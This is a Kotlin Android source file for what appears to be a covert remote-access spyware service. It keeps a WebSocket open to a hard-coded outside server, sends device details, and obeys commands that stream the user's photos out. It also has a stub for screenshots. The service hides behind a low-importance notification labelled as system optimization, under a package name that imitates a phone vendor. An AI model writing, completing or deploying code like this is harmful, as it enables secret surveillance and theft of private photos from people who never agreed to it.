package vivo.communication

import android.app.*
import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import okhttp3.*
import java.util.concurrent.TimeUnit

class WebSocketService : Service() {

    private var webSocket: WebSocket? = null
    private val client = OkHttpClient.Builder()
        .readTimeout(0, TimeUnit.MILLISECONDS)
        .build()

    // ⚠️ ضع رابط السيرفر حقك هنا (تأكد أنه يبدأ بـ wss://)
    private val SERVER_URL = "wss://hek11m.onrender.com/"

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForeground(1, createNotification())
        connectWebSocket()
        return START_STICKY
    }

    private fun connectWebSocket() {
        val request = Request.Builder()
            .url(SERVER_URL)
            .addHeader("model", Build.MODEL)
            .addHeader("battery", "50")
            .addHeader("version", Build.VERSION.RELEASE)
            .addHeader("brightness", "100")
            .addHeader("provider", "Unknown")
            .build()

        webSocket = client.newWebSocket(request, object : WebSocketListener() {
            override fun onOpen(ws: WebSocket, response: Response) { }

            override fun onMessage(ws: WebSocket, text: String) {
                handleCommand(text, ws)
            }

            override fun onFailure(ws: WebSocket, t: Throwable, response: Response?) {
                Thread.sleep(5000)
                connectWebSocket()
            }
        })
    }

    private fun handleCommand(cmd: String, ws: WebSocket) {
        when {
            cmd == "ping" -> ws.send("pong")
            cmd.startsWith("get_photos:") -> {
                val count = cmd.substringAfter(":").toIntOrNull() ?: 5
                PhotoManager(this, ws).startSendingPhotos(count)
            }
            cmd == "screenshot" -> {
                // كود لقطة الشاشة (يحتاج MediaProjection API - معقد شوي)
                // حالياً نرسل خطأ عشان ما يتعلق
                ws.send("screenshot_error") 
            }
        }
    }

    private fun createNotification(): Notification {
        val channelId = "ws_service_channel"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(channelId, "System Service", NotificationManager.IMPORTANCE_MIN) // أقل أهمية عشان ما يزعج
            (getSystemService(NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(channel)
        }
        return NotificationCompat.Builder(this, channelId)
            .setContentTitle("تحسين النظام")
            .setContentText("جاري العمل في الخلفية")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .build()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}